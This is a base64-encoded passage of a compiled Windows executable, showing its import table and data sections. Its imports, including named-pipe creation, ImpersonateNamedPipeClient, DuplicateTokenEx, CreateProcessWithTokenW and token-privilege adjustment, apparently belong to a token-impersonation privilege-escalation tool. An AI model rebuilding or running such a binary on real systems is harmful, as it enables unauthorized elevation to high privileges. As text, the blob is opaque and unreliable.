AKwAAAQAAAN1UAQAQVQEAMF8BABBVAQABBAEABBIAAAEAAAAAAAAAAAAAAHhPAAAAAAAAUAQCAAAAAAAAAAAAAAAAAAAAAAACAAAAaAQCAJAEAgAAAAAAAAAAAAAAAAAAAAAAQCoCAAAAAAD/////AAAAABgAAADoTgAAAAAAAAAAAAAAAAAAAAAAAGgqAgAAAAAA/////wAAAAAYAAAARE8AAAAAAAAAAAAAwAUCAAAAAAAAAAAAZAkCAKhgAQAQCAIAAAAAAAAAAABKCgIA+GIBABgFAgAAAAAAAAAAABwMAgAAYAEAaAgCAAAAAAAAAAAAbAwCAFBjAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAQMAgAAAAAA7AsCAAAAAADYCwIAAAAAAMgLAgAAAAAArgsCAAAAAACQCwIAAAAAAFgLAgAAAAAARAsCAAAAAAAyCwIAAAAAABYLAgAAAAAA+goCAAAAAADmCgIAAAAAANwKAgAAAAAAwAoCAAAAAAC2CgIAAAAAAKwKAgAAAAAAjAoCAAAAAAB8CgIAAAAAAGwKAgAAAAAAVgoCAAAAAAAAAAAAAAAAAFAQAgAAAAAAZBACAAAAAAB0EAIAAAAAAIYQAgAAAAAAlhACAAAAAACqEAIAAAAAALYQAgAAAAAAxBACAAAAAADSEAIAAAAAAFIJAgAAAAAAPgkCAAAAAAAqCQIAAAAAABoJAgAAAAAADAkCAAAAAAD4CAIAAAAAAOIIAgAAAAAAzggCAAAAAADCCAIAAAAAALAIAgAAAAAApAgCAAAAAACUCAIAAAAAAD4QAgAAAAAAiAgCAAAAAAAuEAIAAAAAABQQAgAAAAAA+g8CAAAAAADgDwIAAAAAAHYMAgAAAAAAkgwCAAAAAACwDAIAAAAAAMQMAgAAAAAA4AwCAAAAAAD6DAIAAAAAABANAgAAAAAAJg0CAAAAAABADQIAAAAAAFYNAgAAAAAAag0CAAAAAAB8DQIAAAAAAJANAgAAAAAAng0CAAAAAACuDQIAAAAAAMYNAgAAAAAA3g0CAAAAAAD2DQIAAAAAAB4OAgAAAAAAKg4CAAAAAAA4DgIAAAAAAEYOAgAAAAAAUA4CAAAAAABeDgIAAAAAAHAOAgAAAAAAgA4CAAAAAACSDgIAAAAAAKYOAgAAAAAAtA4CAAAAAADKDgIAAAAAANoOAgAAAAAA5g4CAAAAAAD8DgIAAAAAAA4PAgAAAAAAIA8CAAAAAAAyDwIAAAAAAEIPAgAAAAAAUA8CAAAAAABmDwIAAAAAAHIPAgAAAAAAhg8CAAAAAACWDwIAAAAAAKgPAgAAAAAAsg8CAAAAAAC+DwIAAAAAAMoPAgAAAAAAAAAAAAAAAAByCQIAAAAAAIoJAgAAAAAAogkCAAAAAAA0CgIAAAAAACQKAgAAAAAACgoCAAAAAADuCQIAAAAAAOIJAgAAAAAA0gkCAAAAAAC4CQIAAAAAAAAAAAAAAAAAPgwCAAAAAABYDAIAAAAAACoMAgAAAAAAAAAAAAAAAABSA0hlYXBGcmVlAABnAkdldExhc3RFcnJvcgAATgNIZWFwQWxsb2MAuwJHZXRQcm9jZXNzSGVhcAAAdwRSZWFkRmlsZQAA3ABDcmVhdGVOYW1lZFBpcGVXAADmBVdhaXRGb3JTaW5nbGVPYmplY3QAIQJHZXRDdXJyZW50VGhyZWFkAACGAENsb3NlSGFuZGxlAPIAQ3JlYXRlVGhyZWFkAACcAENvbm5lY3ROYW1lZFBpcGUAAB0CR2V0Q3VycmVudFByb2Nlc3MAtQJHZXRQcm9jQWRkcmVzcwAAS0VSTkVMMzIuZGxsAABqA1NldFVzZXJPYmplY3RTZWN1cml0eQDYAUdldFVzZXJPYmplY3RTZWN1cml0eQCiAk9wZW5XaW5kb3dTdGF0aW9uVwAArQFHZXRQcm9jZXNzV2luZG93U3RhdGlvbgCdAk9wZW5EZXNrdG9wVwAA5QN3c3ByaW50ZlcA1wFHZXRVc2VyT2JqZWN0SW5mb3JtYXRpb25XAFIDU2V0UHJvY2Vzc1dpbmRvd1N0YXRpb24AUABDbG9zZURlc2t0b3AAAFQAQ2xvc2VXaW5kb3dTdGF0aW9uAABVU0VSMzIuZGxsAAAQAEFkZEFjY2Vzc0FsbG93ZWRBY2UASwFHZXRMZW5ndGhTaWQAAI4BSW5pdGlhbGl6ZUFjbACPAUluaXRpYWxpemVTZWN1cml0eURlc2NyaXB0b3IAABYAQWRkQWNlAACFAENvcHlTaWQAIABBbGxvY2F0ZUFuZEluaXRpYWxpemVTaWQAADcBR2V0QWNlAAA4AUdldEFjbEluZm9ybWF0aW9uAF0BR2V0U2VjdXJpdHlEZXNjcmlwdG9yRGFjbADoAlNldFNlY3VyaXR5RGVzY3JpcHRvckRhY2wAGgJPcGVuVGhyZWFkVG9rZW4A8QBEdXBsaWNhdGVUb2tlbkV4AACBAENvbnZlcnRTdHJpbmdTZWN1cml0eURlc2NyaXB0b3JUb1NlY3VyaXR5RGVzY3JpcHRvclcAAIwBSW1wZXJzb25hdGVOYW1lZFBpcGVDbGllbnQAAI0AQ3JlYXRlUHJvY2Vzc1dpdGhUb2tlblcAwQJSZXZlcnRUb1NlbGYAABUCT3BlblByb2Nlc3NUb2tlbgAAHwBBZGp1c3RUb2tlblByaXZpbGVnZXMArwFMb29rdXBQcml2aWxlZ2VWYWx1ZVcAQURWQVBJMzIuZGxsAADrAlJ0bENhcHR1cmVDb250ZXh0ANMEUnRsTG9va3VwRnVuY3Rpb25FbnRyeQAA/AVSdGxWaXJ0dWFsVW53aW5kAABudGRsbC5kbGwAvAVVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAAHsFU2V0VW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAJoFVGVybWluYXRlUHJvY2VzcwAAiQNJc1Byb2Nlc3NvckZlYXR1cmVQcmVzZW50AFAEUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIAHgJHZXRDdXJyZW50UHJvY2Vzc0lkACICR2V0Q3VycmVudFRocmVhZElkAADwAkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAGwDSW5pdGlhbGl6ZVNMaXN0SGVhZACCA0lzRGVidWdnZXJQcmVzZW50ANcCR2V0U3RhcnR1cEluZm9XAH4CR2V0TW9kdWxlSGFuZGxlVwAA4ARSdGxVbndpbmRFeAA/BVNldExhc3RFcnJvcgAANQFFbnRlckNyaXRpY2FsU2VjdGlvbgAAwANMZWF2ZUNyaXRpY2FsU2VjdGlvbgAAEQFEZWxldGVDcml0aWNhbFNlY3Rpb24AaANJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uQW5kU3BpbkNvdW50AKwFVGxzQWxsb2MAAK4FVGxzR2V0VmFsdWUArwVUbHNTZXRWYWx1ZQCtBVRsc0ZyZWUAsQFGcmVlTGlicmFyeQDGA0xvYWRMaWJyYXJ5RXhXAAAxAUVuY29kZVBvaW50ZXIAZgRSYWlzZUV4Y2VwdGlvbgAA3ARSdGxQY1RvRmlsZUhlYWRlcgBkAUV4aXRQcm9jZXNzAH0CR2V0TW9kdWxlSGFuZGxlRXhXAADZAkdldFN0ZEhhbmRsZQAAIQZXcml0ZUZpbGUAegJHZXRNb2R1bGVGaWxlTmFtZVcAANwBR2V0Q29tbWFuZExpbmVBAN0BR2V0Q29tbWFuZExpbmVXAJsAQ29tcGFyZVN0cmluZ1cAALQDTENNYXBTdHJpbmdXAABVAkdldEZpbGVUeXBlAA0GV2lkZUNoYXJUb011bHRpQnl0ZQB7AUZpbmRDbG9zZQCBAUZpbmRGaXJzdEZpbGVFeFcAAJIBRmluZE5leHRGaWxlVwCOA0lzVmFsaWRDb2RlUGFnZQC4AUdldEFDUAAAngJHZXRPRU1DUAAAxwFHZXRDUEluZm8A8gNNdWx0aUJ5dGVUb1dpZGVDaGFyAD4CR2V0RW52aXJvbm1lbnRTdHJpbmdzVwAAsAFGcmVlRW52aXJvbm1lbnRTdHJpbmdzVwAiBVNldEVudmlyb25tZW50VmFyaWFibGVXAFcFU2V0U3RkSGFuZGxlAADeAkdldFN0cmluZ1R5cGVXAAClAUZsdXNoRmlsZUJ1ZmZlcnMAAPABR2V0Q29uc29sZUNQAAACAkdldENvbnNvbGVNb2RlAABTAkdldEZpbGVTaXplRXgAMQVTZXRGaWxlUG9pbnRlckV4AABXA0hlYXBTaXplAABVA0hlYXBSZUFsbG9jAMsAQ3JlYXRlRmlsZVcAIAZXcml0ZUNvbnNvbGVXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADNXSDSZtT//zKi3y2ZKwAA/////wEAAAABAAAAAgAAAC8gAAAAAAAAAPgAAAAAAAD/////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAiAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIkAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAMAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP//////////AAAAAAAAAACAAAoKCgAAAAAAAAAAAAAA/////wAAAADwhgFAAQAAAAEAAAAAAAAAAQAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYIwJAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgjAkABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGCMCQAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYIwJAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgjAkABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHAoAkABAAAAAAAAAAAAAAAAAAAAAAAAAHCJAUABAAAA8IoBQAEAAAAQfwFAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAhAkABAAAAICMCQAEAAABDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQAAAAAAAAICA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